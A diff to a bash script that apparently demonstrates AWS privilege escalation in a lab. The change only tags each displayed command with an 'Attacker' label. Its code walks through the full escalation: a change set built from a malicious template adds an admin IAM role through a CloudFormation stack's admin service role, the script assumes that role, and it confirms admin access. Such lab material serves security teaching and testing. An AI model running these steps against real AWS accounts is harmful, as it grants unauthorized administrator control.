@@ -25,12 +25,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -102,7 +104,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -114,7 +116,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "aws sts get-caller-identity --query 'Account' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -122,7 +124,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
-show_cmd "aws iam list-users --max-items 1"
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -135,7 +137,7 @@ echo -e "${YELLOW}Step 5: Discovering the existing CloudFormation stack${NC}"
 echo "Stack name: $STACK_NAME"
 echo ""
 echo "Stack details:"
-show_cmd "aws cloudformation describe-stacks --region $AWS_REGION --stack-name $STACK_NAME --query 'Stacks[0].[StackName,StackStatus,Description]' --output table"
+show_cmd "Attacker" "aws cloudformation describe-stacks --region $AWS_REGION --stack-name $STACK_NAME --query 'Stacks[0].[StackName,StackStatus,Description]' --output table"
 aws cloudformation describe-stacks \
     --region $AWS_REGION \
     --stack-name $STACK_NAME \
@@ -144,7 +146,7 @@ aws cloudformation describe-stacks \
 
 echo ""
 echo "Stack service role (has admin permissions):"
-show_cmd "aws cloudformation describe-stacks --region $AWS_REGION --stack-name $STACK_NAME --query 'Stacks[0].RoleARN' --output text"
+show_cmd "Attacker" "aws cloudformation describe-stacks --region $AWS_REGION --stack-name $STACK_NAME --query 'Stacks[0].RoleARN' --output text"
 aws cloudformation describe-stacks \
     --region $AWS_REGION \
     --stack-name $STACK_NAME \
@@ -153,7 +155,7 @@ aws cloudformation describe-stacks \
 
 echo ""
 echo "Current stack template (benign - just creates an S3 bucket):"
-show_cmd "aws cloudformation get-template --region $AWS_REGION --stack-name $STACK_NAME --query 'TemplateBody' --output text"
+show_cmd "Attacker" "aws cloudformation get-template --region $AWS_REGION --stack-name $STACK_NAME --query 'TemplateBody' --output text"
 aws cloudformation get-template \
     --region $AWS_REGION \
     --stack-name $STACK_NAME \
@@ -271,7 +273,7 @@ echo "Using cloudformation:CreateChangeSet permission..."
 echo "ChangeSet name: $CHANGESET_NAME"
 echo ""
 
-show_attack_cmd "aws cloudformation create-change-set --region $AWS_REGION --stack-name $STACK_NAME --change-set-name $CHANGESET_NAME --template-body file:///tmp/malicious-changeset-template.json --capabilities CAPABILITY_NAMED_IAM --change-set-type UPDATE --description \"Escalation via CreateChangeSet - adds admin role\""
+show_attack_cmd "Attacker" "aws cloudformation create-change-set --region $AWS_REGION --stack-name $STACK_NAME --change-set-name $CHANGESET_NAME --template-body file:///tmp/malicious-changeset-template.json --capabilities CAPABILITY_NAMED_IAM --change-set-type UPDATE --description \"Escalation via CreateChangeSet - adds admin role\""
 aws cloudformation create-change-set \
     --region $AWS_REGION \
     --stack-name $STACK_NAME \
@@ -293,7 +295,7 @@ echo -e "${YELLOW}Step 8: Viewing ChangeSet details${NC}"
 echo "ChangeSet: $CHANGESET_NAME"
 echo ""
 
-show_cmd "aws cloudformation describe-change-set --region $AWS_REGION --stack-name $STACK_NAME --change-set-name $CHANGESET_NAME --query '[ChangeSetName,Status,Changes[?ResourceChange.Action==\`Add\`].ResourceChange.LogicalResourceId]' --output table"
+show_cmd "Attacker" "aws cloudformation describe-change-set --region $AWS_REGION --stack-name $STACK_NAME --change-set-name $CHANGESET_NAME --query '[ChangeSetName,Status,Changes[?ResourceChange.Action==\`Add\`].ResourceChange.LogicalResourceId]' --output table"
 aws cloudformation describe-change-set \
     --region $AWS_REGION \
     --stack-name $STACK_NAME \
@@ -309,7 +311,7 @@ echo "Using cloudformation:ExecuteChangeSet permission..."
 echo "The stack's admin service role will create the escalated role"
 echo ""
 
-show_attack_cmd "aws cloudformation execute-change-set --region $AWS_REGION --stack-name $STACK_NAME --change-set-name $CHANGESET_NAME"
+show_attack_cmd "Attacker" "aws cloudformation execute-change-set --region $AWS_REGION --stack-name $STACK_NAME --change-set-name $CHANGESET_NAME"
 aws cloudformation execute-change-set \
     --region $AWS_REGION \
     --stack-name $STACK_NAME \
@@ -332,7 +334,7 @@ echo -e "${YELLOW}Step 10: Verifying escalated role was created${NC}"
 ROLE_ARN="arn:aws:iam::$ACCOUNT_ID:role/$ESCALATED_ROLE_NAME"
 echo "Role ARN: $ROLE_ARN"
 
-show_cmd "aws iam get-role --role-name $ESCALATED_ROLE_NAME"
+show_cmd "Attacker" "aws iam get-role --role-name $ESCALATED_ROLE_NAME"
 if aws iam get-role --role-name $ESCALATED_ROLE_NAME &> /dev/null; then
     echo -e "${GREEN}✓ Escalated role exists${NC}"
 
@@ -354,7 +356,7 @@ echo -e "${YELLOW}Step 11: Assuming the escalated admin role${NC}"
 echo "Using sts:AssumeRole to get admin credentials..."
 echo ""
 
-show_cmd "aws sts assume-role --role-arn $ROLE_ARN --role-session-name escalation-demo-session --query 'Credentials' --output json"
+show_cmd "Attacker" "aws sts assume-role --role-arn $ROLE_ARN --role-session-name escalation-demo-session --query 'Credentials' --output json"
 CREDENTIALS=$(aws sts assume-role \
     --role-arn $ROLE_ARN \
     --role-session-name escalation-demo-session \
@@ -368,7 +370,7 @@ export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
 export AWS_REGION=$AWS_REGION
 
 # Verify we assumed the role
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $ROLE_IDENTITY"
 
@@ -382,7 +384,7 @@ echo -e "${GREEN}✓ Successfully assumed escalated admin role${NC}\n"
 echo -e "${YELLOW}Step 12: Verifying administrator access${NC}"
 echo "Attempting to list IAM users..."
 
-show_cmd "aws iam list-users --max-items 3 --output table"
+show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
